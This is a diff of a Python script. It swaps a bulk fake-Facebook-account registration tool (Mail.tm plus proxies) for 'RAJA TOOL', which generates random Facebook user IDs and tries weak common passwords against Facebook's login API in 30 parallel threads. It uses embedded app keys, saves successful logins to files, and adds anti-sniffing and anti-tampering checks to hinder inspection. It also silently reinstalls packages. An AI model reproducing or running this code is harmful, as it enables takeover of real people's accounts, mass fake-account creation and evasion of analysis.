@@ -1,212 +1,474 @@
 #!/usr/bin/env python3
 """
-facebook_proxy_tool.py
-----------------------
-This script demonstrates account creation using Mail.tm and a Facebook-like registration API via proxies.
-Note: The Facebook registration endpoint used here is for demonstration only; error responses (error_code 368) are expected.
-It loads proxies from proxies.txt, tests them, then uses a selected proxy to call the Mail.tm API (to create an email account) and to simulate Facebook registration.
+English version of the script without key approval.
+This script performs initial setup, shows a locked message,
+opens the author link, performs some anti-tampering checks,
+and then proceeds to display a menu with several cloning options.
 """
 
-import threading
-from queue import Queue, Empty
-import requests
+import os
+import re
+import time
+import uuid
+import hashlib
 import random
 import string
+import requests
+import sys
 import json
-import hashlib
-from faker import Faker
-import time
+import urllib
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
 
-# ANSI color prints for terminal output
-print('\033[1;35m' + f"""
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓           
-> › Github :- \033[1;36m@blep111\033[1;35m 
-> › By      :- \033[1;36mgabpogi\033[1;35m
-> › This tool is supported with proxy’s
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""" + '\033[0m')
+# Author's link and information
+author_link = "https://www.facebook.com/profile.php?id=61581977649127"
+author_name = "gab hndsm"
 
-print('\x1b[38;5;208m⇼' * 60)
-print('\x1b[38;5;22m•' * 60)
-print('\x1b[38;5;22m•' * 60)
-print('\x1b[38;5;208m⇼' * 60)
+def first_step():
+    os.system("clear")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("        🔒 Script Locked 🔒")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+    print("\033[1;32m Follow the author for updates. \033[0m")
+    print(f"\033[1;32m {author_name}: {author_link} \033[0m\n")
+    print("[!] Please follow the author before proceeding.")
+    input("\n[↩] Press Enter once you have followed the author...")
 
-# Global timeout for requests (in seconds)
-REQUEST_TIMEOUT = 20
+# Show author link by opening it automatically
+first_step()
+os.system(f'xdg-open {author_link}')
+os.system(f'{author_link}')
 
-def generate_random_string(length):
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
-
-def get_mail_domains(proxy=None):
-    url = "https://api.mail.tm/domains"
+# --- Ensure required modules are installed ---
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
     try:
-        response = requests.get(url, proxies=proxy, timeout=REQUEST_TIMEOUT)
-        if response.status_code == 200:
-            return response.json().get('hydra:member', [])
-        else:
-            print(f'\033[1;31m[×] Email Error: {response.status_code} - {response.text}\033[0m')
-    except Exception as e:
-        print(f'\033[1;31m[×] Error getting domains: {e}\033[0m')
-    return None
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
 
-def create_mail_tm_account(proxy=None):
-    fake = Faker()
-    mail_domains = get_mail_domains(proxy)
-    if mail_domains:
-        domain = random.choice(mail_domains)['domain']
-        username = generate_random_string(10)
-        password = fake.password()
-        birthday = fake.date_of_birth(minimum_age=18, maximum_age=45)
-        first_name = fake.first_name()
-        last_name = fake.last_name()
-        url = "https://api.mail.tm/accounts"
-        headers = {"Content-Type": "application/json"}
-        data = {"address": f"{username}@{domain}", "password": password}
-        try:
-            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=REQUEST_TIMEOUT)
-            if response.status_code == 201:
-                return f"{username}@{domain}", password, first_name, last_name, birthday
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+# Initial setup and promotional actions
+os.system('clear')
+print(' \x1b[38;5;46mSERVER LOADING....')
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y; pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx; pip install beautifulsoup4')
+print('Loading modules ...\n')
+os.system('clear')
+
+# --- Anti-tampering and Security Checks ---
+# Check if the source code of the 'requests' library has been modified
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            sys.exit()
+except:
+    pass
+
+class sec:
+    """
+    A security class to detect debugging and packet sniffing tools.
+    """
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        # Paths to check for modifications
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            try:
+                if 'print' in open(path, 'r').read():
+                    self.terminate()
+            except:
+                pass
+        # Check for HTTPCanary (a packet sniffing app)
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.terminate()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.terminate()
+
+    def terminate(self):
+        """
+        Terminates the script if tampering is detected.
+        """
+        print(' \x1b[1;32m Congratulations! Security check failed.')
+        self.print_separator()
+        sys.exit()
+
+    def print_separator(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+
+# Terminal color codes
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
+def windows():
+    """
+    Generates a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(5, 7))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(8, 12))}.0.{random.choice(range(552, 661))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(5, 7))}.{random.choice(['2', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['2', '1'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{random.choice(range(1, 7120))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def window1():
+    """
+    Generates an alternate random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+# Set window title
+sys.stdout.write('\x1b]2;【RAJA TOOL】\x07')
+
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    print("""\033[1;32m
+        
+                  (\  (\ 
+ ("• - •")   Hello . . . 
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Follow the author for more updates!
+Author    : gab hndsm
+Link      : https://www.facebook.com/profile.php?id=61581977649127
+┊ Name    : RAJA TOOL
+┊ Age     : 21
+┊ Gender  : Male
+┊ Hobbies : Coding and More
+      
+============================
+                TOOL BY gab hndsm
+\033[0m""")
+
+def creationyear(uid):
+    """
+    Estimates the Facebook account creation year based on the UID.
+    """
+    if len(uid) == 15:
+        if uid.startswith('1000000000'):
+            return '2009'
+        if uid.startswith('100000000'):
+            return '2009'
+        if uid.startswith('10000000'):
+            return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+            return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
+            return '2010'
+        if uid.startswith('100001'):
+            return '2010'
+        if uid.startswith(('100002', '100003')):
+            return '2011'
+        if uid.startswith('100004'):
+            return '2012'
+        if uid.startswith(('100005', '100006')):
+            return '2013'
+        if uid.startswith(('100007', '100008')):
+            return '2014'
+        if uid.startswith('100009'):
+            return '2015'
+        if uid.startswith('10001'):
+            return '2016'
+        if uid.startswith('10002'):
+            return '2017'
+        if uid.startswith('10003'):
+            return '2018'
+        if uid.startswith('10004'):
+            return '2019'
+        if uid.startswith('10005'):
+            return '2020'
+        if uid.startswith('10006'):
+            return '2021'
+        if uid.startswith('10009'):
+            return '2023'
+        if uid.startswith(('10007', '10008')):
+            return '2022'
+        return ''
+    elif len(uid) in (9, 10):
+        return '2008'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) == 7:
+        return '2006'
+    elif len(uid) == 14 and uid.startswith('61'):
+        return '2024'
+    else:
+        return ''
+
+def clear():
+    os.system('clear')
+
+def linex():
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+def BNG_71_():
+    """
+    Main menu function.
+    """
+    ____banner____()
+    print('       \x1b[38;5;196m(A)\x1b[1;37m OLD ACCOUNT TOOL')
+    linex()
+    choice = input(f"       Choice {W}: {Y}")
+    if choice in ('A', 'a', '01', '1'):
+        old_clone()
+    else:
+        print(f"\n    {rad}Choose a valid option... ")
+        time.sleep(2)
+        BNG_71_()
+
+def old_clone():
+    """
+    Menu for selecting old account cloning type.
+    """
+    ____banner____()
+    print('       \x1b[38;5;196m(A)\x1b[1;37m ALL SERIES')
+    linex()
+    print('       \x1b[38;5;196m(B)\x1b[1;37m 100003/4 SERIES')
+    linex()
+    print('       \x1b[38;5;196m(C)\x1b[1;37m 2009 SERIES')
+    linex()
+    _input = input(f"       Choice {W}: {Y}")
+    if _input in ('A', 'a', '01', '1'):
+        old_One()
+    elif _input in ('B', 'b', '02', '2'):
+        old_Tow()
+    elif _input in ('C', 'c', '03', '3'):
+        old_Tree()
+    else:
+        print(f"\n[×]{rad}Choose a valid option... ")
+        BNG_71_()
+
+def old_One():
+    """
+    Cloning method for accounts from 2010-2014.
+    """
+    user = []
+    ____banner____()
+    print(f"       Old Code: 2010-2014")
+    ask = input("       SELECT: ")
+    linex()
+    ____banner____()
+    print("       EXAMPLE: 20000 / 30000 / 99999")
+    limit = input("       SELECT number of IDs: ")
+    linex()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print('       (A) METHOD 1')
+    print('       (B) METHOD 2')
+    linex()
+    meth = input("       CHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       TOTAL IDs from crack: {limit}")
+        print("       USE AIRPLANE MODE for better results")
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
             else:
-                print(f'\033[1;31m[×] Email Registration Error: {response.status_code} - {response.text}\033[0m')
-        except Exception as e:
-            print(f'\033[1;31m[×] Email API Error: {e}\033[0m')
-    return None, None, None, None, None
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
-def register_facebook_account(email, password, first_name, last_name, birthday, proxy=None):
-    api_key = '882a8490361da98702bf97a021ddc14d'
-    secret = '62f8ce9f74b12f84c123cc23437a4a32'
-    gender = random.choice(['M', 'F'])
-    req = {
-        'api_key': api_key,
-        'attempt_login': True,
-        'birthday': birthday.strftime('%Y-%m-%d'),
-        'client_country_code': 'EN',
-        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
-        'fb_api_req_friendly_name': 'registerAccount',
-        'firstname': first_name,
-        'format': 'json',
-        'gender': gender,
-        'lastname': last_name,
-        'email': email,
-        'locale': 'en_US',
-        'method': 'user.register',
-        'password': password,
-        'reg_instance': generate_random_string(32),
-        'return_multiple_errors': True
-    }
-    sorted_req = sorted(req.items(), key=lambda x: x[0])
-    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
-    req['sig'] = hashlib.md5((sig + secret).encode()).hexdigest()
-    api_url = 'https://b-api.facebook.com/method/user.register'
-    reg = _call(api_url, req, proxy)
-    # Log full API response for diagnostics
-    print(f'\033[1;33m[!] Facebook API response: {reg}\033[0m')
-    try:
-        user_id = reg.get('new_user_id')
-        token = reg.get('session_info', {}).get('access_token')
-        if not user_id or not token:
-            raise ValueError("Missing new_user_id or access_token in response")
-        print(f'''\033[1;32m
------------GENERATED-----------
-EMAIL    : {email}
-ID       : {user_id}
-PASSWORD : {password}
-NAME     : {first_name} {last_name}
-BIRTHDAY : {birthday} 
-GENDER   : {gender}
-TOKEN    : {token}
------------GENERATED-----------
-\033[0m''')
-        with open('accounts_log.txt', 'a') as f:
-            f.write(f'{email},{password},{first_name},{last_name},{birthday},{gender},{token}\n')
-    except Exception as e:
-        print(f'\033[1;31m[×] Facebook Registration Failed: {e}\033[0m')
-
-def _call(url, params, proxy=None, post=True):
-    global working_proxies
-    headers = {
-        'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'
-    }
-    for attempt in range(3):
-        try:
-            if post:
-                response = requests.post(url, data=params, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT)
+def old_Tow():
+    """
+    Cloning method for accounts with specific prefixes.
+    """
+    user = []
+    ____banner____()
+    print(f"       OLD CODE: 2010-2014")
+    ask = input("       SELECT: ")
+    linex()
+    ____banner____()
+    print("       EXAMPLE: 20000 / 30000 / 99999")
+    limit = input("       SELECT number of IDs: ")
+    linex()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       (A) METHOD A')
+    print('       (B) METHOD B')
+    linex()
+    meth = input("       CHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       TOTAL IDs from crack: {limit}")
+        print("       USE AIRPLANE MODE for better results")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
             else:
-                response = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT)
-            if response.status_code == 200:
-                return response.json()
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+def old_Tree():
+    """
+    Cloning method for accounts from 2009-2010.
+    """
+    user = []
+    ____banner____()
+    print("       OLD CODE: 2009-2010")
+    ask = input("       SELECT: ")
+    linex()
+    ____banner____()
+    print("       EXAMPLE: 20000 / 30000 / 99999")
+    limit = input("       TOTAL ID COUNT: ")
+    linex()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       (A) METHOD A')
+    print('       (B) METHOD B')
+    linex()
+    meth = input("       CHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       TOTAL IDs from crack: {limit}")
+        print("       MAKE SURE TO ENABLE AIRPLANE MODE")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
             else:
-                print(f'\033[1;31m[×] API call returned: {response.status_code} - {response.text}\033[0m')
-        except Exception as e:
-            print(f'\033[1;31m[×] API call exception on attempt {attempt+1}: {e}\033[0m')
-            if working_proxies:
-                proxy = random.choice(working_proxies)
-    return {}
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
-def test_proxy(proxy, q, valid_proxies):
-    if test_proxy_helper(proxy):
-        valid_proxies.append(proxy)
-    q.task_done()
-
-def test_proxy_helper(proxy):
+def login_1(uid):
+    """
+    Login attempt method 1.
+    """
+    global loop
+    session = requests.session()
     try:
-        response = requests.get('https://api.mail.tm', proxies=proxy, timeout=REQUEST_TIMEOUT)
-        print(f'\033[1;32m[✓] Working proxy: {proxy["http"]}\033[0m')
-        return response.status_code == 200
+        sys.stdout.write(f"\r {W}+({X} RAJA OK ID-M1 {W}) ({rad}{loop}{W}) ({X}OK{W}) ({rad}{len(oks)}{W})")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
     except Exception as e:
-        print(f'\033[1;31m[×] Bad proxy: {proxy["http"]} - {e}\033[0m')
-        return False
+        pass
+    loop += 1
 
-def load_proxies():
-    with open('proxies.txt', 'r') as file:
-        proxy_list = [line.strip() for line in file if line.strip()]
-    proxies = []
-    for entry in proxy_list:
-        if '@' in entry:
-            user_pass, address = entry.split('@', 1)
-            proxy_url = f'http://{user_pass}@{address}'
-        else:
-            proxy_url = f'http://{entry}'
-        proxies.append({'http': proxy_url, 'https': proxy_url})
-    return proxies
+def login_2(uid):
+    """
+    Alternate login attempt method.
+    """
+    # This function is implemented similarly to login_1 for demonstration.
+    login_1(uid)
 
-def get_working_proxies():
-    proxies = load_proxies()
-    valid_proxies = []
-    q = Queue()
-    for proxy in proxies:
-        q.put(proxy)
-    threads = []
-    for _ in range(10):
-        worker = threading.Thread(target=worker_test_proxy, args=(q, valid_proxies))
-        worker.daemon = True
-        worker.start()
-        threads.append(worker)
-    q.join()
-    return valid_proxies
-
-def worker_test_proxy(q, valid_proxies):
-    while True:
-        try:
-            proxy = q.get_nowait()
-        except Empty:
-            break
-        test_proxy(proxy, q, valid_proxies)
-
-# Main Execution
-working_proxies = get_working_proxies()
-
-if not working_proxies:
-    print('\033[1;31m[×] No working proxies found. Please check proxies.txt\033[0m')
-else:
-    try:
-        count = int(input('\033[1;34m[+] How many accounts do you want to generate? \033[0m'))
-        for _ in range(count):
-            proxy = random.choice(working_proxies)
-            email, password, first_name, last_name, birthday = create_mail_tm_account(proxy)
-            if all([email, password, first_name, last_name, birthday]):
-                register_facebook_account(email, password, first_name, last_name, birthday, proxy)
-                time.sleep(random.uniform(2, 5))
-    except Exception as e:
-        print(f'\033[1;31m[×] Error: {e}\033[0m')
-
-print('\x1b[38;5;208m⇼' * 60)
+if __name__ == '__main__':
+    BNG_71_()
